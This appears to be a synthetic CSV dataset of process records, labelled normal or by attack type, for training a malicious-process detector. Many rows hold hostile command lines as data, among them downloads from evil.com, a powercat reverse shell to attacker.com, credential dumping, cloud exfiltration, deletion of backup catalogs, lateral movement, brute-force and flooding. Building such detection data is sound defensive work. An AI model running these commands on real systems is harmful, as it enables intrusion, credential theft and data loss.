process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
python3.12.exe,python3.12.exe,17.429230682195012,7.215159798060602,0,15,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,52.988106308530035,14.544394578180363,1,8,0,data_exfiltration,mitre_data_exfiltration,high
NisSrv.exe,NisSrv.exe,12.848599715431853,3.4522596644297625,0,16,0,normal,synthetic_normal,
zloader.exe,zloader.exe --silent,93.6560361473843,36.80797131549616,1,5,0,malware,known_malware,
wannacry.exe,wannacry.exe --silent,45.16708030816186,26.794239967357292,1,12,0,malware,known_malware,
mysqld.exe,mysqld.exe,10.264843035949365,1.3556681561485089,0,14,0,normal,synthetic_normal,
tsc.exe,tsc.exe,18.49383621576054,6.462256729439193,0,16,0,normal,synthetic_normal,
SearchUI.exe,SearchUI.exe,17.042752274721565,4.948936243088509,0,6,0,normal,synthetic_normal,
java.exe,java.exe,32.29851313758063,28.521819708006447,0,11,0,normal,synthetic_normal,
docker.exe,docker.exe,18.20959374834877,5.490822547478516,0,7,0,normal,synthetic_normal,
AfterFX.exe,AfterFX.exe,13.14428367956358,2.358193381859098,0,1,0,normal,synthetic_normal,
sqlservr.exe,sqlservr.exe,16.26663513122243,7.530338166691336,0,20,0,normal,synthetic_normal,
svchost.exe,svchost.exe,26.750610635924044,1.744284915211355,0,4,1,normal,synthetic_normal,
psexec.exe,psexec.exe \\target -s cmd.exe,54.2445252320578,17.234413051024497,1,9,0,lateral_movement,mitre_lateral_movement,high
wbadmin.exe,wbadmin.exe delete catalog -quiet,45.3711804586559,10.188010371497088,0,4,0,ransomware,mitre_ransomware,critical
hping3.exe,hping3.exe --flood -p 80 target.com,97.21201657803911,14.744568580887726,1,1504,0,ddos,ddos_tools,
ConEmuC.exe,ConEmuC.exe,29.98803125493726,2.7810286390525287,0,8,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,11.94072248856793,2.3918031875327506,0,19,0,normal,synthetic_normal,
npx.exe,npx.exe,20.40470445491049,0.6026687314492497,0,4,0,normal,synthetic_normal,
zloader.exe,zloader.exe --silent,51.82490363566697,11.627994773066957,1,7,0,malware,known_malware,
Signal.exe,Signal.exe,22.115141553494055,0.9666675217634797,1,20,0,normal,synthetic_normal,
Registry,Registry,3.658742186142584,6.4489688603114494,1,5,0,normal,synthetic_normal,
maze.exe,maze.exe --silent,69.50609731552211,22.734484200014723,1,26,0,malware,known_malware,
System,System,4.958938622616106,0.7257728773595536,0,20,1,normal,synthetic_normal,
comsvcs.dll,rundll32.exe comsvcs.dll MiniDump,69.3201797026835,11.15081402176022,1,3,0,credential_dumping,mitre_credential_dumping,critical
powershell.exe,powershell.exe -ep bypass -file malware.ps1,30.97603692813866,21.592608265697294,0,9,0,malware,mitre_malicious_scripts,high
secretsdump.py,python secretsdump.py,38.89410734914787,21.86021399773969,1,8,0,credential_dumping,mitre_credential_dumping,critical
zsh.exe,zsh.exe,10.975465549278834,1.567476738915283,1,6,0,normal,synthetic_normal,
Signal.exe,Signal.exe,27.056279164026616,7.514792254351815,1,10,0,normal,synthetic_normal,
opera.exe,opera.exe,12.459793175008636,0.6855649393375303,0,12,0,normal,synthetic_normal,
yarn.exe,yarn.exe,23.457115461852634,4.174064940237907,0,5,0,normal,synthetic_normal,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,68.45351682035341,6.215895294528055,1,178,0,brute_force,brute_force_tools,
dotnet.exe,dotnet.exe,4.45312709975965,4.001965298891369,0,9,0,normal,synthetic_normal,
npm.exe,npm.exe,27.298006754885655,1.9429900812206098,0,0,0,normal,synthetic_normal,
webpack.exe,webpack.exe,27.24100295371641,3.4923665725881325,1,3,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,12.419686582719216,2.88594385732646,0,11,0,normal,synthetic_normal,
WindowsTerminal.exe,WindowsTerminal.exe,26.875166941461398,7.907395712819158,0,16,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,24.407033561396872,6.927878018084872,0,17,0,normal,synthetic_normal,
rider64.exe,rider64.exe,8.704580903637936,5.606490086400202,1,18,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,9.272591633796859,3.496801547882227,0,13,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,3.5407347923118158,2.642327966932888,0,18,0,normal,synthetic_normal,
WUDFHost.exe,WUDFHost.exe,20.128722831422362,3.8464471121122528,0,4,0,normal,synthetic_normal,
svchost32.exe,svchost32.exe --silent,44.98716889522385,20.771811548090884,1,17,0,malware,known_malware,
maze.exe,maze.exe --silent,54.64469220774147,33.25349532163082,1,28,0,malware,known_malware,
hping3.exe,hping3.exe --flood -p 80 target.com,93.08334271175158,21.46518795669922,1,945,0,ddos,ddos_tools,
ryuk.exe,ryuk.exe --silent,32.508034343292344,19.157667215474508,1,23,0,ransomware,known_malware,
darkside.exe,darkside.exe --silent,57.60994057743065,13.420829855531645,1,14,0,malware,known_malware,
rustc.exe,rustc.exe,6.488981640319135,3.2677292162794003,1,8,0,normal,synthetic_normal,
ZoomIt.exe,ZoomIt.exe,4.908820490306263,0.7008559836095938,1,4,0,normal,synthetic_normal,
webstorm64.exe,webstorm64.exe,3.2834869909905917,7.280745534134684,0,12,0,normal,synthetic_normal,
java.exe,java.exe,16.81217100211946,9.565896596788852,0,1,0,normal,synthetic_normal,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,81.22093967037321,18.369924320568643,1,263,0,brute_force,brute_force_tools,
WinRAR.exe,WinRAR.exe,14.634820264968369,5.062249482724676,1,4,0,normal,synthetic_normal,
ONENOTE.EXE,ONENOTE.EXE,27.903339951229604,7.950444521026983,1,11,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,87.02247742511523,37.44072079373349,1,1203,0,ddos,ddos_tools,
dasHost.exe,dasHost.exe,9.799025956147677,7.366953945033124,1,8,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,57.2060224963958,16.496564664224188,1,269,0,brute_force,brute_force_tools,
WINWORD.EXE,WINWORD.EXE,4.620202641997922,4.299753792113156,0,18,0,normal,synthetic_normal,
wmiprvse.exe,wmiprvse.exe,26.4615814430503,2.5775665938867953,0,14,0,normal,synthetic_normal,
vbc.exe,vbc.exe,28.703328385807577,0.6447769189436174,0,3,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,19.285372454944365,5.064391565437874,0,10,0,normal,synthetic_normal,
printspoofer.exe,printspoofer.exe -i -c cmd,62.051303431438484,8.189111449474595,1,4,0,privilege_escalation,mitre_privilege_escalation,critical
cgminer.exe,cgminer.exe --silent,38.1235348647947,34.53399495764985,1,15,0,ddos,known_malware,
System,System,4.157919041577438,0.7346467342790907,0,18,1,normal,synthetic_normal,
iCloudServices.exe,iCloudServices.exe,3.1602396666492485,0.9035171081621549,0,13,0,normal,synthetic_normal,
WUDFHost.exe,WUDFHost.exe,10.46915324041969,3.333683522586005,0,5,0,normal,synthetic_normal,
Discord.exe,Discord.exe,7.117904884134612,3.427224347021043,0,5,0,normal,synthetic_normal,
mpc-hc64.exe,mpc-hc64.exe,15.363026204945271,4.429236217600964,1,15,0,normal,synthetic_normal,
locker.exe,locker.exe --wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh,58.5758983027053,16.891517784280108,0,1,0,ransomware,mitre_ransomware,critical
ShellExperienceHost.exe,ShellExperienceHost.exe,28.974795222223793,6.726533001017481,1,7,0,normal,synthetic_normal,
make.exe,make.exe,15.077454458214328,3.542579639943449,1,12,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,56.95051186286586,15.62024635296058,1,276,0,brute_force,brute_force_tools,
services.exe,services.exe,2.9524490337409945,1.8589272727776982,0,10,0,normal,synthetic_normal,
oracle.exe,oracle.exe,8.10346421439975,4.681638901805346,0,14,0,normal,synthetic_normal,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,2.8529600415749137,5.115498852384561,1,8,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,97.1508112282433,30.566376479521647,1,1996,0,ddos,ddos_tools,
seatbelt.exe,seatbelt.exe -group=all,29.495361402479624,19.592818403256132,0,1,0,privilege_escalation,mitre_privilege_escalation,medium
svchost.exe,svchost.exe,22.89617546989005,1.2165815204529433,0,11,1,normal,synthetic_normal,
System Idle Process,System Idle Process,81.59904210168096,0.8720546896392306,0,20,1,normal,synthetic_normal,
atexec.py,python atexec.py user:pass@target,75.68833510971865,13.51603446907,1,7,0,lateral_movement,mitre_lateral_movement,high
go.exe,go.exe,18.650843951347888,1.1912148646390648,0,19,0,normal,synthetic_normal,
vbc.exe,vbc.exe,20.336135435232784,5.851107957364398,0,13,0,normal,synthetic_normal,
g++.exe,g++.exe,24.394633548934443,5.9837889541466565,0,18,0,normal,synthetic_normal,
megasync.exe,megasync.exe --upload C:\SensitiveData,51.79701822303913,10.335283320576194,1,7,0,data_exfiltration,mitre_data_exfiltration,high
MpCmdRun.exe,MpCmdRun.exe,16.154922007934374,5.282282333692954,0,1,0,normal,synthetic_normal,
MSBuild.exe,MSBuild.exe,16.59667555436014,29.74600399312109,0,0,0,normal,synthetic_normal,
peazip.exe,peazip.exe,11.37190143575453,5.1985832130626655,1,14,0,normal,synthetic_normal,
psexec64.exe,psexec64.exe -accepteula \\target,24.39169139711228,16.180100571731334,1,0,0,lateral_movement,mitre_lateral_movement,high
yarn.exe,yarn.exe,22.59739249520375,6.703405763633484,1,9,0,normal,synthetic_normal,
iexplore.exe,iexplore.exe,9.645023778314194,4.203244668729386,0,12,0,normal,synthetic_normal,
Zoom.exe,Zoom.exe,23.235804863750452,1.7562258456702717,0,16,0,normal,synthetic_normal,
atexec.py,python atexec.py user:pass@target,73.76253341812136,21.489144565980418,1,4,0,lateral_movement,mitre_lateral_movement,high
masscan.exe,masscan.exe -p1-65535 192.168.1.0/24,39.32780074772731,19.627389444054497,1,10,0,reconnaissance,mitre_network_scanning,medium
Everything.exe,Everything.exe,22.500788856761922,2.5824987896769214,0,1,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,95.28466634090763,15.25793438784817,1,383,0,brute_force,brute_force_tools,
hancitor.exe,hancitor.exe --silent,79.39976577851003,33.35992606467258,1,13,0,malware,known_malware,
sharphound.ps1,powershell.exe -ep bypass Invoke-BloodHound,60.083427172000896,14.218622252496022,0,8,0,reconnaissance,mitre_reconnaissance,critical
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,40.830309532206954,15.696371338524244,1,341,0,brute_force,brute_force_tools,
MSBuild.exe,MSBuild.exe,27.094002969037557,23.75801528894121,0,2,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,17.710118353150925,7.740750300011152,1,7,0,normal,synthetic_normal,
yarn.exe,yarn.exe,16.162693830607534,2.270489402865057,1,6,0,normal,synthetic_normal,
services.exe,services.exe,27.65504144406132,2.172427356553399,1,10,0,normal,synthetic_normal,
chrome_update.exe,chrome_update.exe --silent,48.978468998402334,38.08310705152701,1,3,0,malware,known_malware,
dwm.exe,dwm.exe,8.259622217709792,7.52267993104523,0,10,0,normal,synthetic_normal,
winlogin.exe,winlogin.exe --silent,41.278104068337285,29.95090558056657,1,10,0,trojan,known_malware,
loic.exe,loic.exe --target 192.168.1.1 --port 80,85.19119202378916,13.286024040071567,1,567,0,ddos,ddos_tools,
powercat.ps1,powershell.exe powercat -c attacker.com -p 4444 -e cmd,66.91845542753045,17.663346595127834,1,5,0,trojan,mitre_command_control,critical
javaws.exe,javaws.exe,10.050296516252114,7.495408166964234,0,10,0,normal,synthetic_normal,
notepad.exe,notepad.exe,9.95309831477573,7.7763876602428725,0,14,0,normal,synthetic_normal,
firefox.exe,firefox.exe,51.109908992095605,24.64808536320144,0,9,0,normal,synthetic_normal,
zloader.exe,zloader.exe --silent,33.81687352101146,12.26321953798622,1,29,0,malware,known_malware,
procexp.exe,procexp.exe,25.38145040251195,1.0354742710327876,0,14,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,59.210579987830904,13.971249922308852,1,280,0,brute_force,brute_force_tools,
SyncThing.exe,SyncThing.exe,12.475209006023833,3.629250793877999,0,4,0,normal,synthetic_normal,
secretsdump.py,python secretsdump.py,37.47383672274223,20.47965449698286,1,9,0,credential_dumping,mitre_credential_dumping,critical
python.exe,python.exe,33.41466705698868,30.527056951498558,0,3,0,normal,synthetic_normal,
certutil.exe,certutil.exe -urlcache -split -f http://evil.com/malware.exe,32.17995743183371,12.607876699804352,1,3,0,malware,mitre_download_execute,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,90.81051625763632,26.657706880522444,1,1536,0,ddos,ddos_tools,
iCloudServices.exe,iCloudServices.exe,13.375587509160141,6.931161476864591,1,17,0,normal,synthetic_normal,
MpCopyAccelerator.exe,MpCopyAccelerator.exe,20.26597160903408,2.151068852446077,0,0,0,normal,synthetic_normal,
hoic.exe,hoic.exe,84.35443801260658,33.53626907076774,1,357,0,ddos,ddos_tools,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,98.6897369119934,17.25128589664427,1,276,0,brute_force,brute_force_tools,
com.docker.backend.exe,com.docker.backend.exe,15.656882047076369,5.885180191170804,0,20,0,normal,synthetic_normal,
g++.exe,g++.exe,6.3133849910036215,4.309968381244211,1,1,0,normal,synthetic_normal,
svhost.exe,svhost.exe --silent,31.149909104771883,36.88308070556169,1,25,0,malware,known_malware,
Docker Desktop.exe,Docker Desktop.exe,28.931984385547693,1.9090047043711473,0,12,0,normal,synthetic_normal,
powershell.exe,powershell.exe,24.621345318342286,5.640213636739841,0,13,0,normal,synthetic_normal,
python3.exe,python3.exe,25.353757181752183,2.065468852423076,0,13,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,8.17189419823534,5.827467353564934,0,0,0,normal,synthetic_normal,
pwsh.exe,pwsh.exe,24.318701574678887,7.250805056765326,0,17,0,normal,synthetic_normal,
wbadmin.exe,wbadmin.exe delete catalog -quiet,77.80122569682418,17.26498028455495,0,6,0,ransomware,mitre_ransomware,critical
sqlservr.exe,sqlservr.exe,10.359008415358694,6.846869451788631,0,7,0,normal,synthetic_normal,
asyncrat.exe,asyncrat.exe --silent,83.08255499753338,34.6101491792588,1,19,0,trojan,known_malware,
SecurityHealthService.exe,SecurityHealthService.exe,18.045804365230545,7.272870341642334,0,19,0,normal,synthetic_normal,
fontdrvhost.exe,fontdrvhost.exe,9.542465906284754,4.853694668568475,0,16,0,normal,synthetic_normal,
cpuminer.exe,cpuminer.exe --silent,34.32175261688295,29.512143086817463,1,19,0,ddos,known_malware,
msedge.exe,msedge.exe,21.531899063879084,23.993459689168404,0,13,0,normal,synthetic_normal,
OneDrive.exe,OneDrive.exe,19.99341801570267,4.758575248177965,0,0,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,18.866469025481507,1.2390334842432216,0,7,0,normal,synthetic_normal,
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,47.66057799529405,11.772661977071595,0,0,0,ransomware,mitre_ransomware,high
ssh-agent.exe,ssh-agent.exe,14.671339784941296,4.912030305284695,0,3,0,normal,synthetic_normal,
ursnif.exe,ursnif.exe --silent,67.63051975411142,36.32542780312553,1,21,0,malware,known_malware,
SearchUI.exe,SearchUI.exe,15.852899163882084,5.569798480907691,0,9,0,normal,synthetic_normal,
Teams.exe,Teams.exe,26.16708873338225,6.240977590489169,0,0,0,normal,synthetic_normal,
javaws.exe,javaws.exe,23.851343819035133,1.2609989679849403,0,14,0,normal,synthetic_normal,
spoolsv.exe,spoolsv.exe,12.651414618280105,7.866023506370804,0,10,0,normal,synthetic_normal,
redis-server.exe,redis-server.exe,6.4679061650242105,4.956160718629564,0,0,0,normal,synthetic_normal,
powerup.ps1,powershell.exe -ep bypass -file powerup.ps1,58.853450061398526,10.75481084142223,0,8,0,privilege_escalation,mitre_privilege_escalation,high
Dropbox.exe,Dropbox.exe,29.09249480268719,7.412961136140785,0,17,0,normal,synthetic_normal,
cobalt_strike,beacon.exe,62.050557671292964,15.073988744063913,1,9,0,trojan,mitre_command_control,critical
bash.exe,bash.exe,8.547457235835408,0.788916541761244,0,16,0,normal,synthetic_normal,
git.exe,git.exe,26.66611978719445,6.546971463733183,1,1,0,normal,synthetic_normal,
bazarloader.exe,bazarloader.exe --silent,48.81044591109674,38.37720079647332,1,10,0,malware,known_malware,
7zFM.exe,7zFM.exe,19.533711292822588,7.3449517534772735,0,11,0,normal,synthetic_normal,
chromium.exe,chromium.exe,11.605283284185877,7.874006626218082,0,3,0,normal,synthetic_normal,
lockbit.exe,lockbit.exe --silent,35.929041098749735,37.58514613740297,1,13,0,ransomware,known_malware,
fish.exe,fish.exe,4.194838645637892,2.53519746932575,0,3,0,normal,synthetic_normal,
winlogon.exe,winlogon.exe,20.135731999431517,3.52665238967455,1,18,0,normal,synthetic_normal,
services.exe,services.exe,28.825353998239873,7.6381024181382715,0,8,0,normal,synthetic_normal,
cryptor.exe,cryptor.exe -aes256 -all,71.73913465226772,13.709608673610907,1,2,0,ransomware,mitre_ransomware,critical
dwm.exe,dwm.exe,11.4803770341163,4.982195394148026,1,10,0,normal,synthetic_normal,
vivaldi.exe,vivaldi.exe,2.1494456449203025,7.695652575020051,1,4,0,normal,synthetic_normal,
Code.exe,Code.exe,24.116672419484768,1.0812934564579813,1,5,0,normal,synthetic_normal,
Blender.exe,Blender.exe,5.499524421175046,2.0598348477009614,0,10,0,normal,synthetic_normal,
webstorm64.exe,webstorm64.exe,19.684032351935887,7.433987856702387,0,6,0,normal,synthetic_normal,
npm.exe,npm.exe,26.007939267088865,6.923268032310728,0,8,0,normal,synthetic_normal,
kerbrute.exe,kerbrute.exe userenum users.txt,62.89555885090013,12.445162914881578,0,10,0,reconnaissance,mitre_reconnaissance,high
chrome.exe,chrome.exe,32.92805840875786,13.961182274194686,0,1,0,normal,synthetic_normal,
rubeus.exe,rubeus.exe kerberoast,70.22286691285973,18.460027471962803,0,8,0,reconnaissance,mitre_reconnaissance,critical
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,84.84508152434077,14.024100066804934,1,244,0,brute_force,brute_force_tools,
rollup.exe,rollup.exe,14.182838101498481,7.294905821771199,0,0,0,normal,synthetic_normal,
megasync.exe,megasync.exe --upload C:\SensitiveData,30.857960064841663,13.00891989806481,1,0,0,data_exfiltration,mitre_data_exfiltration,high
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",71.08476593475622,13.069422600256427,1,219,0,brute_force,brute_force_tools,
ShellExperienceHost.exe,ShellExperienceHost.exe,27.330530470708357,1.382666578285206,1,18,0,normal,synthetic_normal,
python3.exe,python3.exe,0.29278449417842634,4.44928686316938,0,12,0,normal,synthetic_normal,
Photoshop.exe,Photoshop.exe,11.447078903160874,3.5143740305760156,0,16,0,normal,synthetic_normal,
gpg.exe,gpg.exe,5.3831895385933475,6.379959709782882,0,2,0,normal,synthetic_normal,
curl.exe,curl.exe -o malware.exe http://evil.com/payload,72.47490725600451,18.44970331524505,1,7,0,malware,mitre_download_execute,medium
advanced_port_scanner.exe,advanced_port_scanner.exe,20.035374507220205,17.12918277498478,1,20,0,reconnaissance,mitre_network_scanning,low
cmd.exe,cmd.exe,3.411231384388913,0.8882496604388563,0,9,0,normal,synthetic_normal,
vlc.exe,vlc.exe,23.53009841347067,3.169424360604507,1,13,0,normal,synthetic_normal,
Registry,Registry,24.93296008817479,0.7651450960382218,0,10,0,normal,synthetic_normal,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,7.396777930513202,6.466433092793916,1,13,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,89.90368573213334,12.70362310177591,1,1118,0,ddos,ddos_tools,
dotnet.exe,dotnet.exe,3.100692500427553,7.927712948124779,0,16,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,14.536067791631925,3.7521143072341587,0,0,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,82.79398269878794,12.633069307867117,1,1580,0,ddos,ddos_tools,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,85.2311668136957,37.35270821881147,1,756,0,ddos,ddos_tools,
lsass.exe,lsass.exe,13.692314786406865,6.8852304972124445,0,18,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,95.95148739734701,33.87308589774451,1,683,0,ddos,ddos_tools,
rubeus.exe,rubeus.exe asreproast,25.34458855826167,18.365023830018053,1,1,0,reconnaissance,mitre_reconnaissance,critical
hoic.exe,hoic.exe,98.7262567599688,14.506019512753044,1,1631,0,ddos,ddos_tools,
sweetpotato.exe,sweetpotato.exe -p cmd.exe,43.60137010168602,22.165138711120647,0,8,0,privilege_escalation,mitre_privilege_escalation,critical
icedid.exe,icedid.exe --silent,50.763211795441286,21.43323920885483,1,20,0,malware,known_malware,
csrss.exe,csrss.exe,3.1675222714136506,2.712080925214891,1,1,0,normal,synthetic_normal,
tsc.exe,tsc.exe,12.7456104925697,6.957539109002403,0,3,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,23.53278711260964,4.404339845114762,1,1,0,normal,synthetic_normal,
WUDFHost.exe,WUDFHost.exe,10.070600708829252,4.9435688931412525,1,11,0,normal,synthetic_normal,
lync.exe,lync.exe,5.827659490780983,2.1551615071656265,0,13,0,normal,synthetic_normal,
python.exe,python.exe,56.06812881438991,14.045989985830742,0,9,0,normal,synthetic_normal,
notepad.exe,notepad.exe,0.5354342526169964,2.2815854916062372,1,1,0,normal,synthetic_normal,
Discord.exe,Discord.exe,13.345610732445625,6.418626502839783,0,10,0,normal,synthetic_normal,
fish.exe,fish.exe,12.193831823231111,1.5485801121628155,0,15,0,normal,synthetic_normal,
python3.exe,python3.exe,29.641922658126443,7.927675192579902,1,15,0,normal,synthetic_normal,
SenseIR.exe,SenseIR.exe,7.757876658833592,7.87699102311401,0,10,0,normal,synthetic_normal,
webpack.exe,webpack.exe,23.700392856091955,2.2193792076605607,1,13,0,normal,synthetic_normal,
sh.exe,sh.exe,13.730438017331592,1.1860483948660256,1,4,0,normal,synthetic_normal,
7zG.exe,7zG.exe,14.709879090579502,1.3229725230174167,1,17,0,normal,synthetic_normal,
blackmatter.exe,blackmatter.exe --silent,85.56008214456864,23.519849627237498,1,5,0,malware,known_malware,
System,System,3.2712454836664473,0.23607800555742742,0,18,1,normal,synthetic_normal,
rustup.exe,rustup.exe,22.360636260897778,4.777908492062265,0,18,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,94.60144780960452,35.44245987682797,1,1878,0,ddos,ddos_tools,
dash.exe,dash.exe,9.272936206952174,6.8614209128155546,0,9,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,17.869966453977028,6.857869232929123,0,18,0,normal,synthetic_normal,
njrat.exe,njrat.exe --silent,82.19181122184916,38.52460250061138,1,12,0,trojan,known_malware,
rollup.exe,rollup.exe,8.934724242893825,5.136799379660268,0,8,0,normal,synthetic_normal,
procexp.exe,procexp.exe,13.352829981267583,3.76557613910397,0,17,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,90.2883953044651,31.236600693363293,1,502,0,ddos,ddos_tools,
com.docker.proxy.exe,com.docker.proxy.exe,8.547950736574762,7.374258116056911,1,14,0,normal,synthetic_normal,
rustc.exe,rustc.exe,11.966654476329635,1.7992270245550968,1,11,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,85.52993353715786,32.79404157257396,1,1983,0,ddos,ddos_tools,
bash.exe,bash.exe,25.273028308336606,7.928056651122915,0,7,0,normal,synthetic_normal,
smbexec.py,python smbexec.py domain/user:pass@target,28.41810106739406,19.90865860998816,1,10,0,lateral_movement,mitre_lateral_movement,critical
com.docker.proxy.exe,com.docker.proxy.exe,12.765713358892114,6.553458510894166,0,20,0,normal,synthetic_normal,
curl.exe,curl.exe -o malware.exe http://evil.com/payload,20.906784892764517,12.364303520246425,1,1,0,malware,mitre_download_execute,medium
rustc.exe,rustc.exe,11.822201098671488,0.5352121379417758,1,10,0,normal,synthetic_normal,
GoogleDriveSync.exe,GoogleDriveSync.exe,8.13142368945675,5.487207876202045,0,18,0,normal,synthetic_normal,
wsl.exe,wsl.exe,3.876594804211008,5.916586599485861,0,2,0,normal,synthetic_normal,
blackcat.exe,blackcat.exe --silent,90.86713081156188,30.107229407429685,1,30,0,malware,known_malware,
psexec64.exe,psexec64.exe -accepteula \\target,51.92658905552293,10.079279687306766,1,1,0,lateral_movement,mitre_lateral_movement,high
fish.exe,fish.exe,23.104549443472745,6.382537753591101,0,19,0,normal,synthetic_normal,
git-remote-https.exe,git-remote-https.exe,0.9791042110548176,2.9045506065951336,0,16,0,normal,synthetic_normal,
explorer.exe,explorer.exe,8.06315958757951,4.395399319300765,1,2,0,normal,synthetic_normal,
MsSense.exe,MsSense.exe,10.447315758116039,0.8381691521851491,0,16,0,normal,synthetic_normal,
oracle.exe,oracle.exe,12.30468804877871,3.416181347539677,0,0,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,15.676799148273279,7.0077111915439945,0,17,0,normal,synthetic_normal,
Zoom.exe,Zoom.exe,9.158718156859768,4.038586696892347,0,2,0,normal,synthetic_normal,
bash.exe,bash.exe,8.786804393013174,6.678434586015883,1,8,0,normal,synthetic_normal,
vbc.exe,vbc.exe,9.067493201947709,6.31044671657601,1,16,0,normal,synthetic_normal,
dllhost.exe,dllhost.exe,24.101584720704526,7.768524807495746,0,13,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,29.081965419539458,2.6579464836368976,1,17,0,normal,synthetic_normal,
sharpup.exe,sharpup.exe,76.38974572186194,5.954261537949086,1,4,0,privilege_escalation,mitre_privilege_escalation,medium
MpCmdRun.exe,MpCmdRun.exe,23.54834675576119,4.332456597792949,0,4,0,normal,synthetic_normal,
dllhost.exe,dllhost.exe,12.548979315141214,1.9209171954031674,1,10,0,normal,synthetic_normal,
ONENOTE.EXE,ONENOTE.EXE,22.44769910582491,3.5000029981928917,0,13,0,normal,synthetic_normal,
svchost.exe,svchost.exe,4.924391335978883,4.755344108783368,0,20,1,normal,synthetic_normal,
sharphound.exe,sharphound.exe -c All --outputdirectory C:\temp,21.957390084648022,10.21079325698211,0,6,0,reconnaissance,mitre_reconnaissance,critical
ProcessHacker.exe,ProcessHacker.exe,18.6030381976694,3.1867675309754526,0,20,0,normal,synthetic_normal,
rider64.exe,rider64.exe,20.00951758267458,7.897419013409756,0,7,0,normal,synthetic_normal,
Telegram.exe,Telegram.exe,12.749895961566327,2.9272464719582523,0,14,0,normal,synthetic_normal,
sqlservr.exe,sqlservr.exe,21.65607726587241,1.3096840175970752,0,2,0,normal,synthetic_normal,
svchost.exe,svchost.exe,7.82309264368271,6.271443000920918,0,20,1,normal,synthetic_normal,
MsSense.exe,MsSense.exe,12.477138032362069,3.1750272112528277,0,11,0,normal,synthetic_normal,
Skype.exe,Skype.exe,12.976512888192925,2.699597752794183,1,20,0,normal,synthetic_normal,
python.exe,python.exe,43.725529527154805,7.630689341898314,1,8,0,normal,synthetic_normal,
rollup.exe,rollup.exe,24.408661959736488,3.3515989832833646,1,20,0,normal,synthetic_normal,
vbc.exe,vbc.exe,5.965549347744167,3.275536847494916,0,18,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,99.23015734816238,18.746374020959063,1,419,0,ddos,ddos_tools,
